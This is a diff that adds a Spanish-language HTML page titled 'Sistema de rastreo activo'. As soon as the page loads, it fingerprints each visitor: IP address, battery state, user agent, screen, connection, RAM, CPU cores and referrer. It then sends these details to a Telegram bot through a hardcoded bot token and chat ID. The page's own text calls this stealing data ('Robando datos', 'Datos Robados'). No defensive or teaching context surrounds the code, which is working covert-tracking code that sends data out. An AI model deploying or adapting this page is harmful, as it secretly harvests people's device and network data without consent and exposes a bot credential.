@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Sistema de rastreo activo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+      padding-top: 100px;
+    }
+    #estado {
+      font-size: 1.2em;
+      color: #333;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>📡 Sistema de rastreo activo</h1>
+  <div id="estado">Robando datos...</div>
+
+  <script>
+    async function enviarTelegram() {
+      const estado = document.getElementById('estado');
+
+      try {
+        // Ejecutar tareas en paralelo
+        const [
+          ipRes,
+          batteryPromise
+        ] = await Promise.all([
+          fetch("https://api64.ipify.org?format=json"),
+          navigator.getBattery?.() || Promise.resolve(null)
+        ]);
+
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        const hora = new Date().toLocaleString();
+        const idioma = navigator.language;
+        const resolucion = `${screen.width}x${screen.height}`;
+        const agente = navigator.userAgent;
+        const tipoConexion = navigator.connection?.effectiveType || "desconocida";
+        const nucleos = navigator.hardwareConcurrency || "desconocido";
+        const memoria = navigator.deviceMemory || "desconocida";
+        const modo = window.matchMedia("(prefers-color-scheme: dark)").matches ? "🌑 Oscuro" : "🌕 Claro";
+        const referrer = document.referrer || "Acceso directo";
+
+        let nivel = "desconocido";
+        let cargando = "desconocido";
+        if (batteryPromise) {
+          nivel = Math.round(batteryPromise.level * 100) + "%";
+          cargando = batteryPromise.charging ? "🔌 Cargando" : "🔋 No cargando";
+        }
+
+        const mensaje = `📥 Nuevo visitante\n🔋 Batería: ${nivel}\n⚡ Estado de carga: ${cargando}\n📱 Dispositivo: ${agente}\n🌐 IP: ${ip}\n🕒 Hora: ${hora}\n🗣️ Idioma: ${idioma}\n🖥️ Resolución: ${resolucion}\n📶 Conexión: ${tipoConexion}\n💾 RAM: ${memoria} GB\n🧠 Núcleos: ${nucleos}\n🎨 Tema: ${modo}\n🔗 Origen: ${referrer}`;
+
+        const url = "https://api.telegram.org/bot8115773636:AAH7Zz4ZbpqsL96GQqINLGIwyPqgWg_0-eA/sendMessage";
+        const datos = {
+          chat_id: 7043817199,
+          text: mensaje
+        };
+
+        const respuesta = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(datos)
+        });
+
+        estado.textContent = respuesta.ok ? "Datos Robados✅️" : "❌ Error al enviar a Telegram";
+
+      } catch (err) {
+        estado.textContent = "⚠️ Error al obtener datos";
+        console.error("Error:", err);
+      }
+    }
+
+    enviarTelegram();
+  </script>
+
+</body>
+</html>
